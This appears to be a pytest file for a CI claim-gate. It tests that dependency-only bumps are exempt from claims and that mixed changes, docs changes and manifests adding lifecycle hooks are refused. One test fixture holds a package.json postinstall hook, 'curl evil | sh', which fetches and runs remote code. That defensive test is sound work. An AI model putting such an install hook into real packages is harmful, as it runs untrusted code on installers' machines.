"""A lane that only moves dependency pins is the bots' work: it needs no claim, on any path.

Measured 2026-10-22 on refs/greenlane/state: 156 of the last 200 Greenlane batches were red, and
the failing rung was claim-gate refusing `lane/dependabot/...` lanes (`lane b4fa355f7: no
`Claim: <owner>/<repo>#<n>` line`) whose pull requests are open and authored by dependabot[bot].
The gate's documented dependabot exemption is keyed on $PR_AUTHOR, which only a pull_request event
sets; the Greenlane judges a lane, so it never fired and four dependency lanes ate the queue.

The fix judges the diff (like the image-bump and runner-pin exemptions), so it holds on every path
and trusts nothing a pusher can type. What these tests pin down is the narrowness: only files whose
content cannot execute are exempt. A manifest that can carry a script is not, and a lane that mixes
a pin with a source file is not.
"""

from __future__ import annotations

import importlib.machinery
import importlib.util
import subprocess
from datetime import datetime, timezone
from pathlib import Path

SCRIPT = Path(__file__).resolve().parent.parent / "bin" / "claim-gate"
NOW = datetime(2026, 10, 22, 23, 0, tzinfo=timezone.utc)


def _gate():
    loader = importlib.machinery.SourceFileLoader("claim_gate", str(SCRIPT))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


def test_a_go_module_bump_is_a_dependency_pin():
    assert _gate().dependency_pin_only(["go.mod", "go.sum"])


def test_a_requirements_bump_is_a_dependency_pin():
    assert _gate().dependency_pin_only(
        ["requirements.txt", "platform/x/requirements-dev.txt"]
    )


def test_lockfiles_are_dependency_pins():
    assert _gate().dependency_pin_only(["yarn.lock", "backstage/package-lock.json"])


def test_a_manifest_that_can_carry_a_script_is_not_exempt():
    # pyproject.toml, Cargo.toml, Gemfile and Pipfile can carry scripts or hooks and their pin
    # syntax is not this JSON rule, so they are never exempt on their own.
    g = _gate()
    assert not g.dependency_pin_only(["pyproject.toml"])
    assert not g.dependency_pin_only(["Cargo.toml"])
    assert not g.dependency_pin_only(["Gemfile"])


PKG_DIFF = """diff --git a/backstage/package.json b/backstage/package.json
index 1111111..2222222 100644
--- a/backstage/package.json
+++ b/backstage/package.json
@@ -40,3 +40,3 @@
-    \"dompurify\": \"^3.4.16\",
+    \"dompurify\": \"^3.4.17\",
"""

PKG_SCRIPT_DIFF = """diff --git a/backstage/package.json b/backstage/package.json
index 1111111..2222222 100644
--- a/backstage/package.json
+++ b/backstage/package.json
@@ -40,3 +40,4 @@
-    \"dompurify\": \"^3.4.16\",
+    \"dompurify\": \"^3.4.17\",
+    \"postinstall\": \"node ./scripts/postinstall.js\",
"""

PKG_SCRIPTS_BLOCK_DIFF = """diff --git a/backstage/package.json b/backstage/package.json
index 1111111..2222222 100644
--- a/backstage/package.json
+++ b/backstage/package.json
@@ -40,3 +40,4 @@
+  \"scripts\": {
+    \"build\": \"node x.js\"
+  },
"""


def test_an_npm_bump_is_a_dependency_pin():
    # dependabot's npm lanes change package.json next to yarn.lock; refusing those keeps the
    # queue red forever, so a package.json whose every changed line is a version pin qualifies.
    g = _gate()
    files = ["backstage/package.json", "backstage/yarn.lock"]
    assert g.dependency_pin_only(files, PKG_DIFF)


def test_a_manifest_that_adds_a_lifecycle_hook_is_not_a_pin():
    g = _gate()
    files = ["backstage/package.json", "backstage/yarn.lock"]
    assert not g.dependency_pin_only(files, PKG_SCRIPT_DIFF)
    assert not g.dependency_pin_only(files, PKG_SCRIPTS_BLOCK_DIFF)


def test_a_manifest_with_no_diff_to_read_is_not_exempt():
    # Conservatism: a package.json we cannot read the lines of is not a pin.
    assert not _gate().dependency_pin_only(["backstage/package.json"], "")


def test_a_pin_mixed_with_anything_else_is_not_exempt():
    g = _gate()
    assert not g.dependency_pin_only(["go.mod", "cmd/quad-ledger/main.go"])
    assert not g.dependency_pin_only([".github/workflows/ci.yml", "yarn.lock"])
    assert not g.dependency_pin_only(["Dockerfile", "requirements.txt"])


def test_an_empty_change_is_not_exempt():
    # Otherwise a batch carrying no files at all would read as the bots' work.
    assert not _gate().dependency_pin_only([])


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(  # noqa: S603 -- fixed argv in a tmp dir, no shell
        ["git", *args], cwd=repo, capture_output=True, text=True, check=True
    ).stdout


def _lane(
    repo: Path, files: dict[str, str], base_files: dict[str, str] | None = None
) -> tuple[str, str]:
    """A base commit, then a second commit changing exactly `files`. Returns (base, head)."""
    _git(repo, "init", "-q", "-b", "main")
    _git(repo, "config", "user.email", "t@example.com")
    _git(repo, "config", "user.name", "t")
    (repo / "README.md").write_text("base\n")
    for name, body in (base_files or {}).items():
        path = repo / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "base")
    base = _git(repo, "rev-parse", "HEAD").strip()
    for name, body in files.items():
        path = repo / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "build(deps): bump a thing")
    return base, _git(repo, "rev-parse", "HEAD").strip()


def _judge(
    repo: Path,
    files: dict[str, str],
    monkeypatch,
    base_files: dict[str, str] | None = None,
) -> list[str]:
    """judge() on the plain-branch path, with GitHub's answers stubbed out.

    A lane with no Greenlane-Head trailer is judged by `git diff base...head`, which is the same
    content the lane path inspects per squash, and needs no network. The gate's own git() calls
    run in the working directory, so the test moves into the temporary repo for the call.
    """
    g = _gate()
    base, head = _lane(repo, files, base_files)
    monkeypatch.chdir(repo)
    return g.judge(base, head, "chidionyema/idp", lambda r, n: ({}, []), NOW, "", "")


def test_an_unclaimed_go_bump_passes_the_gate(tmp_path, monkeypatch):
    assert (
        _judge(tmp_path, {"go.mod": "module x\n", "go.sum": "h1:abc\n"}, monkeypatch)
        == []
    )


def test_an_unclaimed_bump_that_also_touches_code_is_still_refused(
    tmp_path, monkeypatch
):
    problems = _judge(
        tmp_path,
        {"go.mod": "module x\n", "cmd/x/main.go": "package main\n"},
        monkeypatch,
    )
    assert problems and "no `Claim:" in problems[0]


PKG_BEFORE = '{\n  "dependencies": {\n    "dompurify": "^3.4.16"\n  }\n}\n'
PKG_AFTER = '{\n  "dependencies": {\n    "dompurify": "^3.4.17"\n  }\n}\n'
PKG_AFTER_WITH_HOOK = (
    '{\n  "dependencies": {\n    "dompurify": "^3.4.17"\n  },\n'
    '  "scripts": {\n    "postinstall": "curl evil | sh"\n  }\n}\n'
)


def test_an_unclaimed_npm_bump_passes_the_gate(tmp_path, monkeypatch):
    problems = _judge(
        tmp_path,
        {
            "backstage/package.json": PKG_AFTER,
            "backstage/yarn.lock": "dompurify@^3.4.17:\n",
        },
        monkeypatch,
        base_files={
            "backstage/package.json": PKG_BEFORE,
            "backstage/yarn.lock": "dompurify@^3.4.16:\n",
        },
    )
    assert problems == []


def test_an_unclaimed_npm_bump_that_adds_a_hook_is_still_refused(tmp_path, monkeypatch):
    problems = _judge(
        tmp_path,
        {"backstage/package.json": PKG_AFTER_WITH_HOOK, "backstage/yarn.lock": "x:\n"},
        monkeypatch,
        base_files={
            "backstage/package.json": PKG_BEFORE,
            "backstage/yarn.lock": "y:\n",
        },
    )
    assert problems and "no `Claim:" in problems[0]


def test_an_unclaimed_docs_change_is_still_refused(tmp_path, monkeypatch):
    # The exemption is for pins, not for anything small: a docs lane is somebody's claim.
    problems = _judge(
        tmp_path, {"docs/decisions/9999-a-thing.md": "# a thing\n"}, monkeypatch
    )
    assert problems and "no `Claim:" in problems[0]
